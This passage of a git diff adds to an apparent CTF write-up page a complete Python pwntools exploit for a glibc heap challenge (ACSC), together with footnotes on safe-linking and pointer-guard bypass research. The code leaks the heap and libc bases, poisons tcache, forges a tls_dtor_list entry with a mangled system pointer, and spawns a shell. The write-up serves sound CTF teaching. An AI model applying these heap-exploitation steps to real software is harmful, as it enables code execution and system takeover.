+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">heap_base</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span><span class="o">^</span><span class="n">addr_fd</span>  
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reveal</span><span class="p">(</span><span class="n">current</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">heap_base</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span><span class="o">^</span><span class="n">current</span>  
+</span></span><span class="line"><span class="cl"><span class="n">rol</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">val</span><span class="p">,</span> <span class="n">r_bits</span><span class="p">,</span> <span class="n">max_bits</span><span class="p">:</span> \
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">|</span> \
+</span></span><span class="line"><span class="cl">    <span class="p">((</span><span class="n">val</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="n">max_bits</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">max_bits</span><span class="o">-</span><span class="p">(</span><span class="n">r_bits</span><span class="o">%</span><span class="n">max_bits</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># leak heap base</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">list</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[1] &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> 
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;heap base:&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># tcache poisoning to alloc 2 chunks at tcache_perthread_struct</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">protect</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">protect</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># alloc 2 chunk at tcache struct, set bin 0x290 (tcache struct&#39;s size) to 7, then if I free one of the two prepared, it will be put into unsorted bin </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># thus lib base can be leaked</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x200000000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x27</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">7</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">list</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[6] &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lib_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x219ce0</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;lib base: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">lib_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">lib</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">lib_base</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># fix tcache struct (it is messy now)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># edit(4, 0x70, p16(0)*30)  # no need to fix</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># poison tcache again to create fake dtor_list item (-8 for alignment check)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tls_dtor_list</span> <span class="o">=</span> <span class="n">lib_base</span> <span class="o">-</span> <span class="mh">0x2918</span> <span class="o">-</span> <span class="mi">8</span> 
+</span></span><span class="line"><span class="cl"><span class="n">pointer_guard</span> <span class="o">=</span> <span class="n">lib_base</span> <span class="o">-</span> <span class="mh">0x2890</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x00000000001d8698</span> <span class="o">+</span> <span class="n">lib_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_dtor_list</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xa0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;tls_dtor_list: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">tls_dtor_list</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;pointer_guard: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pointer_guard</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="n">p16</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span><span class="o">//</span><span class="mi">2</span><span class="p">))</span>     <span class="c1"># overwrite tcache-&gt;counts</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">tls_dtor_list</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pointer_guard</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="n">lib</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">],</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mi">64</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">))</span>    <span class="c1"># overwrite tcache-&gt;entries</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>   <span class="c1"># overwrite pointer_guard</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_dtor_list</span><span class="p">))</span>  <span class="c1"># write fake dtor_list item </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ACSC{r34ll0c_15_n07_ju57_r34ll0c473}</span>
+</span></span></code></pre></td></tr></table>
 </div>
+</div>
+  </div>
+</div>
+<div class="footnotes" role="doc-endnotes">
+<hr />
+<ol>
+<li id="fn:1">
+<p><a href="https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/">https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2">
+<p><a href="https://blog.infosectcbr.com.au/2020/04/bypassing-pointer-guard-in-linuxs-glibc.html">https://blog.infosectcbr.com.au/2020/04/bypassing-pointer-guard-in-linuxs-glibc.html</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3">
+<p><a href="https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html">https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+
     </article>
     
     
@@ -2860,6 +3229,7 @@ document.addEventListener('DOMContentLoaded', function () {
         <li><a href="#leak-libc-base-and-control-tcache_perthread_struct">Leak libc base and control tcache_perthread_struct</a></li>
         <li><a href="#tls_dtor_list">tls_dtor_list</a></li>
         <li><a href="#pointer-mangling">Pointer mangling</a></li>
+        <li><a href="#full-exploit-code">Full exploit code</a></li>
       </ul>
     </li>
   </ul>
